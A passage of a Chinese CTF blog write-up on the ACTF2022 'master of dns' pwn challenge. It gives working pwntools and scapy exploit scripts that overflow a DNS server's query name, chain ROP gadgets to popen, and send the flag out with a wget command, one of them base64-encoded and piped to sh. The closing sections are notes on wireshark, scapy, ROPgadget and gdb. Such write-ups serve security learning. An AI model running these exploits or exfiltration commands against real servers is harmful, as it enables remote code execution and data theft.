arw4(bss_data_addr+<span class="number">12</span>,mycmd[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    payload += call_popen(bss_data_addr,str_r_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="comment"># 打包shellcode：发送8字节（2*4byte）的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_payload2</span>(<span class="params">mycmd</span>):</span></span><br><span class="line">    payload = arw4(bss_data_addr,mycmd[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">4</span>,mycmd[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    payload += p32(nop_2e_ret)</span><br><span class="line">    payload += call_popen(bss_data_addr,str_r_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接远程服务器并发送dns请求报文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_pack</span>(<span class="params">payload</span>):</span></span><br><span class="line">    io = remote(<span class="string">&quot;59.63.224.108&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line">    <span class="comment"># io = remote(&quot;127.0.0.1&quot;,9999,typ=&quot;udp&quot;)</span></span><br><span class="line">    dns_data = DNS(byte_data)</span><br><span class="line">    name_seg = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x385</span> + payload</span><br><span class="line">    dns_data.qd = DNSQR(qname=name_seg,qtype=<span class="number">1</span>,qclass=<span class="number">1</span>)	<span class="comment"># 将新的data揉进dns报文中</span></span><br><span class="line">    byte_send = raw(dns_data)</span><br><span class="line">    io.sendline(byte_send)</span><br><span class="line">    io.close()</span><br><span class="line">    sleep(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test_str = b&quot;wget http://127.0.0.1:6789/ \`cat /flag \`&quot;</span></span><br><span class="line">test_str = <span class="string">b&quot;wget  http://127.0.0.1:6789/$(cat /flag)&quot;</span>		<span class="comment"># 将要写入脚本中的字符串，将127.0.0.1改成接收flag的服务器ip，监听6789端口（nc -l 6789）</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;(<span class="built_in">len</span>(test_str)-<span class="number">1</span>):</span><br><span class="line">    target = test_str[i:i+<span class="number">2</span>]</span><br><span class="line">    mycmd1 = <span class="string">b&#x27;echo -n &quot;&#x27;</span>+target+<span class="string">b&#x27;&quot;&gt;&gt;/tmp/y&#x27;</span>		<span class="comment"># 通过popen执行echo命令，一次只能发送2个有效字节（哭</span></span><br><span class="line">    payload1 = pack_payload5(mycmd1)</span><br><span class="line">    send_pack(payload1)</span><br><span class="line">    i+=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">ch_exec_cmd = <span class="string">b&quot;chmod u+x /tmp/y&quot;</span>			<span class="comment"># 脚本内容发送完毕后，给脚本文件增加执行权限</span></span><br><span class="line">payload2 = pack_payload4(ch_exec_cmd)</span><br><span class="line">send_pack(payload2)</span><br><span class="line"></span><br><span class="line">exec_cmd = <span class="string">b&quot;/tmp/y  &quot;</span>					<span class="comment"># 等脚本成功执行，就能在我们自己的服务器上看到flag啦~</span></span><br><span class="line">payload3 = pack_payload2(exec_cmd)</span><br><span class="line">send_pack(payload3)</span><br></pre></td></tr></table></div></figure>
+<p>拿到flag</p>
+<p><img src="image-20220630175529627.png" alt="image-20220630175529627"></p>
+
+        <h2 id="方法2：利用更巧妙的gadget"   >
+          <a href="#方法2：利用更巧妙的gadget" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法2：利用更巧妙的gadget" class="headerlink" title="方法2：利用更巧妙的gadget"></a>方法2：利用更巧妙的gadget</h2>
+      <p>上面的方法需要多次跟服务器交互发送报文，由于发送的报文会导致dns服务重启，下一次发送需等待至少15秒，速度极慢。考虑存不存在ROP链能实现发送一次报文就成功利用。</p>
+<p>控制流劫持时，寄存器情况如下：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$eax</span>   : 0xffffffff</span><br><span class="line"><span class="variable">$ebx</span>   : 0xffffffff</span><br><span class="line"><span class="variable">$ecx</span>   : 0xffb3d140  →  <span class="string">&quot;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;.ls &gt; /tmp/x&quot;</span></span><br><span class="line"><span class="variable">$edx</span>   : 0xffb3ce67  →  <span class="string">&quot;ls &gt; /tmp/x #;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[...]&quot;</span></span><br><span class="line"><span class="variable">$esp</span>   : 0xffb3d1ec  →  0x11111111</span><br><span class="line"><span class="variable">$ebp</span>   : 0x2e656463 (<span class="string">&quot;cde.&quot;</span>?)</span><br><span class="line"><span class="variable">$esi</span>   : 0x09fe69c0  →  0x00002910</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7f58000  →  0x001ead6c</span><br><span class="line"><span class="variable">$eip</span>   : 0x0804f613  →   ret </span><br></pre></td></tr></table></div></figure>
+<p>目标gadget “call popen”的参数分别存在eax和edx中：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08071802  	push    edx             ; modes</span><br><span class="line">.text:08071803  	push    eax             ; command</span><br><span class="line">.text:08071804   	call    _popen</span><br></pre></td></tr></table></div></figure>
+<p>eax我们通过输入就能直接控制，edx中存着command的地址。如果它们能把edx的值给eax就好了。</p>
+<p>寻找跟edx与eax相关的操作指令，如mov，add，sub，xchg等。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./dns | grep add | grep edx | grep ret</span><br><span class="line">......</span><br><span class="line">0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span><br><span class="line">0x0808787b : add eax, edx ; leave ; ret			<span class="comment"># leave会迁移栈，不适用本题情况</span></span><br><span class="line">......</span><br></pre></td></tr></table></div></figure>
+<p>于是发现了0x804b639这条gadget。</p>
+<p>调试过程中发现两个问题：</p>
+<ol>
+<li><p>add eax,edx后，需要给eax加1。于是通过<code>0x08056434</code>这条gadget配合给eax的初始值来调整</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08056434 : add eax, 0x1b8 ; add cl, cl ; ret</span><br><span class="line">0x0804c29a : adc al, 1 ; ret 0x458b  		<span class="comment"># ret 0x458b不可用，esp会转移到未map地址空间</span></span><br></pre></td></tr></table></div></figure>
+
+</li>
+<li><p>在执行popen函数过程中，command由于在低地址，被新的数据覆盖了，导致无法成功执行命令。</p>
+<p>于是需要将command放在我们payload的后面（栈的高地址空间按），并调整一下eax的值</p>
+</li>
+</ol>
+<p>最终利用脚本如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;59.63.224.108&quot;,9999,typ=&quot;udp&quot;)</span></span><br><span class="line"></span><br><span class="line">eax_init = <span class="number">0xf7f593d5</span>         <span class="comment"># hex(0xffffffff - 0x80a6fe0 + 0x3b6) = 0xf7f593d5</span></span><br><span class="line">g_adjust_eax = <span class="number">0x0804b319</span>      <span class="comment"># 0x0804b319 : add eax, 0x80a6fe0 ; add ecx, ecx ; ret</span></span><br><span class="line">g_add_eax_edx = <span class="number">0x0804b639</span>      <span class="comment"># add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">g_pop_edx = <span class="number">0x0807ec72</span>            <span class="comment"># pop edx ; ret</span></span><br><span class="line">r_addr = <span class="number">0x809c7b2</span>              <span class="comment"># &amp;&#x27;r&#x27;</span></span><br><span class="line">g_popen_addr = <span class="number">0x08071802</span>       <span class="comment"># push edx; push eax; call _popen</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_pkg</span>(<span class="params">input_str</span>):</span></span><br><span class="line">    <span class="comment"># the data extracted from dns packet</span></span><br><span class="line">    start_dns = <span class="string">b&quot;\x24\xb4\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01&quot;</span></span><br><span class="line">    end_dns = <span class="string">b&quot;\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xbe\x1c\x51\x4d\x75\xab\x0c\x7f&quot;</span></span><br><span class="line">    patch = <span class="string">b&quot;\x3f&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x3f</span></span><br><span class="line">    shellcode1 = patch*<span class="number">13</span> + <span class="string">b&quot;\x3f&quot;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">29</span> +p32(eax_init) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span> + <span class="string">b&quot;\x04&quot;</span>+ <span class="string">b&quot;a&quot;</span>*<span class="number">4</span></span><br><span class="line">    shellcode2 = <span class="string">b&quot;\x2c&quot;</span> + p32(g_add_eax_edx)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0xffffffff</span>)\</span><br><span class="line">            +p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0xffffffff</span>)\</span><br><span class="line">            +p32(g_adjust_eax)+p32(g_pop_edx)+p32(r_addr)+p32(g_popen_addr)</span><br><span class="line">    cmd_str = <span class="built_in">chr</span>(<span class="built_in">len</span>(input_str)+<span class="number">3</span>).encode() + <span class="string">b&quot;a&quot;</span>*<span class="number">3</span> + input_str</span><br><span class="line">    payload = start_dns + shellcode1 + shellcode2 + cmd_str + end_dns</span><br><span class="line">    <span class="comment"># print(len(shellcode1))        # 0x385</span></span><br><span class="line">    <span class="comment"># print(len(shellcode2))        # 0x2d</span></span><br><span class="line">    <span class="comment"># print(hex(len(shellcode1)+len(shellcode2)))       # 0x3b2</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo wget 127.0.0.1/`cat /flag` | base64  #### d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=</span></span><br><span class="line">input_str = <span class="string">b&quot;echo d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=|base64 -d|sh&quot;</span>       <span class="comment"># 根据自己服务器ip不同，需要改base64的内容</span></span><br><span class="line">payload = construct_pkg(input_str)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="续：wireshark-scapy处理网络数据包"   >
+          <a href="#续：wireshark-scapy处理网络数据包" class="heading-link"><i class="fas fa-link"></i></a><a href="#续：wireshark-scapy处理网络数据包" class="headerlink" title="续：wireshark+scapy处理网络数据包"></a>续：wireshark+scapy处理网络数据包</h1>
+      
+        <h2 id="wireshark抓包"   >
+          <a href="#wireshark抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112649281" >Ubuntu 上 Wireshark 的安装与使用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>安装wireshark并抓包</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt show wireshark			<span class="comment"># 查看wireshark的可用版本</span></span><br><span class="line">sudo apt install wireshark		<span class="comment"># 安装wireshark</span></span><br><span class="line">sudo wireshark					<span class="comment"># 以root用户启动wireshark</span></span><br></pre></td></tr></table></div></figure>
+<p>dig访问本地9999端口调用dns解析服务，用wireshark抓包。先后访问了两次，得到如下报文：<a href="dns_catch.pcapng">dns_catch.pcapng</a></p>
+<p><img src="image-20220628174139141.png" alt="image-20220628174139141"></p>
+<p>Data段未自动解析成dns报文（因端口非默认的53），因此按如下步骤将dns udp对应的端口设置成9999</p>
+<p><img src="image-20220628174655395.png" alt="image-20220628174655395"></p>
+<p>选中DNS，改UDP ports为9999</p>
+<p><img src="image-20220628174745837.png" alt="image-20220628174745837"></p>
+<p>解析成功，如下：</p>
+<p><img src="image-20220628175000577.png" alt="image-20220628175000577"></p>
+
+        <h2 id="安装scapy"   >
+          <a href="#安装scapy" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装scapy" class="headerlink" title="安装scapy"></a>安装scapy</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hiyong/p/14406739.html" >Python Scapy 报文构造和解析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/278399" >地表最强数据包工具–Scapy基础篇</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mathpretty.com/12344.html" >网络工具-Scapy使用介绍</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://developer.51cto.com/article/660332.html" >盘点一款Python发包收包利器——Scapy</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/KiteRunner/article/details/119521215" >Python学习：scapy库的Packet与str相互转换</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scapy</span><br></pre></td></tr></table></div></figure>
+<p>在python中引入scapy库</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = rdpcap(<span class="string">&quot;./dns_catch.pcapng&quot;</span>)</span><br><span class="line">packet.summary()</span><br><span class="line">packet[<span class="number">0</span>].show()</span><br><span class="line">print(packet[<span class="number">3</span>][Ether].src)</span><br><span class="line">print(packet[<span class="number">3</span>][IP].src)</span><br><span class="line">print(ls())					<span class="comment"># 显示所有支持的数据包对象。另，通过ls(ARP)来查看指定包的具体内容</span></span><br><span class="line">print(lsc())				<span class="comment"># 列出所有函数</span></span><br><span class="line">show_interfaces()			<span class="comment"># 显示网卡信息</span></span><br></pre></td></tr></table></div></figure>
+<p>用scapy交互操作网络数据包，读取pcap文件中Raw部分，并按DNS格式解析</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = rdpcap(<span class="string">&quot;./dns_catch.pcapng&quot;</span>)</span><br><span class="line">byte_data = packet[<span class="number">2</span>][Raw].load</span><br><span class="line">dns_data = DNS(byte_data)</span><br><span class="line">dns_data.show()			<span class="comment"># 可以查看数据按照DNS格式解析后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换域名字段发起攻击</span></span><br><span class="line">dns_data.qd = DNSQR(qname=<span class="string">&quot;qqqqqq.aaaaa.sssss.com.ddddd.dddddd&quot;</span>,qtype=<span class="number">1</span>,qclass=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">byte_send = raw(dns_data)		<span class="comment"># 将&lt;class &#x27;scapy.layers.dns.DNS&#x27;&gt;转换成&lt;class &#x27;bytes&#x27;&gt;类型</span></span><br><span class="line"></span><br><span class="line">io.sendline(byte_send)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个DNS请求报文</span></span><br><span class="line"><span class="comment"># c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)</span></span><br><span class="line"><span class="comment"># c.qd = DNSQR(qname=www.baidu.com,qtype=1,qclass=1)</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="构造报文"   >
+          <a href="#构造报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造报文" class="headerlink" title="构造报文"></a>构造报文</h2>
+      <p>用pwntools发送一个合法的包</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;\x24\xb4\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x05\x62\x61\x69\x64\x75\x03\x63\x6f\x6d\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xbe\x1c\x51\x4d\x75\xab\x0c\x7f&quot;</span></span><br><span class="line"><span class="comment"># 这段数据是直接从wireshark中摘出来的</span></span><br><span class="line">io.sendline(a)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="续：x86下找可用的gadget"   >
+          <a href="#续：x86下找可用的gadget" class="heading-link"><i class="fas fa-link"></i></a><a href="#续：x86下找可用的gadget" class="headerlink" title="续：x86下找可用的gadget"></a>续：x86下找可用的gadget</h1>
+      <p>一种方法是使用 <code>--only</code> 指定</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;xchg|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;add|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;sub|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;inc|ret&quot;</span></span><br><span class="line">ROPgadget --binary ./dns --only <span class="string">&quot;dec|ret&quot;</span></span><br><span class="line"><span class="comment"># 等等</span></span><br></pre></td></tr></table></div></figure>
+<p>另一个种方法是直接 <code>grep</code></p>
+<p>例如，本题中找到带0x2e的nop+ret指令，可以用如下命令：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./dns | grep 2e | grep nop</span><br><span class="line">0x08052e0e : inc ebp ; nop ; jmp 0x8052ea8</span><br><span class="line">0x08052eb5 : nop ; add byte ptr [ebp + 0x4d], dh ; jmp 0x8052ec8</span><br><span class="line">0x08052eb2 : nop ; cmp dword ptr [ebp - 0x70], 0 ; jne 0x8052f0d ; jmp 0x8052ecb</span><br><span class="line">0x08052e0f : nop ; jmp 0x8052ea7</span><br><span class="line">0x0808cc29 : nop ; jmp 0x808cc2e</span><br><span class="line">0x0804a92e : nop ; ret</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="续：比对二进制-bindiff的使用方法"   >
+          <a href="#续：比对二进制-bindiff的使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#续：比对二进制-bindiff的使用方法" class="headerlink" title="续：比对二进制-bindiff的使用方法"></a>续：比对二进制-bindiff的使用方法</h1>
+      <p>函数级diff工具：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.zynamics.com/software.html" >bindiff</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>结合IDA一起使用</p>
+
+        <h1 id="续：GDB调试方法汇总"   >
+          <a href="#续：GDB调试方法汇总" class="heading-link"><i class="fas fa-link"></i></a><a href="#续：GDB调试方法汇总" class="headerlink" title="续：GDB调试方法汇总"></a>续：GDB调试方法汇总</h1>
+      <p>1、正常使用gdb启动程序</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./xxx</span><br></pre></td></tr></table></div></figure>
+<p>2、正常启动程序，使用gdb attach</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 窗口1</span></span><br><span class="line">./xxx</span><br><span class="line"><span class="comment"># 窗口2</span></span><br><span class="line">ps -ef | grep xxx</span><br><span class="line">gdb -p &lt;xxx pid&gt;</span><br></pre></td></tr></table></div></figure>
+<p>3、正常启动程序，使用gdbserver attach，后使用gdb连接</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 窗口1</span></span><br><span class="line">./xxx</span><br><span class="line"><span class="comment"># 窗口2</span></span><br><span class="line">ps -ef | grep xxx</span><br><span class="line">gdbserver :1234 --attach &lt;xxx pid&gt;</span><br><span class="line"><span class="comment"># 窗口3</span></span><br><span class="line">gdb</span><br><span class="line">&gt; target remote :1234</span><br></pre></td></tr></table></div></figure>
+<p>4、【多进程】启动程序时指明不开启子进程</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dns -d -C .&#x2F;dns.conf</span><br></pre></td></tr></table></div></figure>
+<p>5、设置gdb调试多进程/多线程</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/gatieme/article/details/78309696" >GDB 调试多进程或者多线程应用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode [parent|child]		<span class="comment"># 设置调试[父进程/子进程]</span></span><br><span class="line"><span class="built_in">set</span> detach-on-fork [on|off]				<span class="comment"># 未调试进程[继续执行/block在fork位置]</span></span><br><span class="line">show follow-fork-mode</span><br><span class="line">show detach-on-fork</span><br><span class="line">info inferiors				<span class="comment"># 查看正在调试的进程信息</span></span><br><span class="line">info threads				<span class="comment"># 查询线程</span></span><br><span class="line">thread &lt;thread number&gt;		<span class="comment"># 切换线程</span></span><br></pre></td></tr></table></div></figure>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1757470" >使用strace跟踪多进程程序</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -ff -o test.txt .&#x2F;dns -C .&#x2F;dns.conf</span><br></pre></td></tr></table></div></figure>
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/">http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/dns/">dns</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/wireshark/">wireshark</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/scapy/">scapy</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/bindiff/">bindiff</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/gdb/">gdb</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/02/20/alles-ctf-2020-nullptr/"><span class="paginator-prev__text">alles ctf 2020之nullptr</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" 